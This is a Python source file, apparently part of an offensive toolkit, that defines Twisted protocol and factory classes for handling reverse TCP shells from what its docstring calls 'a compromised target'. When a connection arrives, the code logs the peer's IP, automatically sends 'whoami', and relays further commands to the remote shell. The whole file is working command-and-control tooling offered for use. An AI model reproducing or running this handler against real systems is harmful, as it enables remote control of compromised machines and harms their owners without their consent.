"""
Handles a reverse tcp connection from a compromised target.

Catches the shell and interacts with it, passing commands and arguments to and from the remote shell.
"""
from twisted.internet.protocol import Protocol, ClientFactory
from twisted.internet import defer, reactor


class ReverseTCPProtocol(Protocol):
	def __init__(self, factory, session):
		self.factory = factory
		self.session = session

		# Fingerprinting
		self.ip = None
		self.username = None
		self.hostname = None

	def connectionMade(self):
		self.ip = self.transport.getPeer().host
		self.session.set_connection(self)
		print("[+] connection made to {}".format(self.ip))
		self.send_command("whoami")

	def dataReceived(self, data):
		print("[+] data received from {}".format(self.ip))
		print("\t[+]\t{}".format(data))
		self.session.update_waiting_on_response(waiting=False)

	def disconnect_with_inactivity(self):
		print("[!] disconnected from {} due to inactivity".format(self.ip))

	"""
	=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	=-=-=-=-=-=-=-=-=-=-=-=-=-=- Custom Methods -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
	=-=-=-=-=-=-=-=-=-=-=- currently only works on *nix =-=-=-=-=-=-=-=-=-=-=-=
	"""

	def send_command(self, command):
		""" This will likely break future implementations."""
		if self.session.waiting_on_response:
			print("[!] cannot send another command, still waiting for response")
		else:
			print("[*] sending command\n\t[*]\t\'{}\'".format(command))
			self.transport.write(bytes("{}\n".format(command), 'utf8'))
			self.session.update_waiting_on_response(waiting=True)


class ReverseTCPFactory(ClientFactory):
	def __init__(self, session):
		self.connections = []
		self.session = session

	def startedConnecting(self, connector):
		print("[*] starting connection to")

	def buildProtocol(self, addr):
		protocol = ReverseTCPProtocol(self, self.session)
		self.connections.append(protocol)
		return protocol

	def clientConnectionLost(self, connector, reason):
		print("[!] connection lost")

	def clientConnectionFailed(self, connector, reason):
		print("[!] connection failed")

	"""
	def send_message(self, message):
		for connection in self.connections:
			connection.send_command(message)
	"""
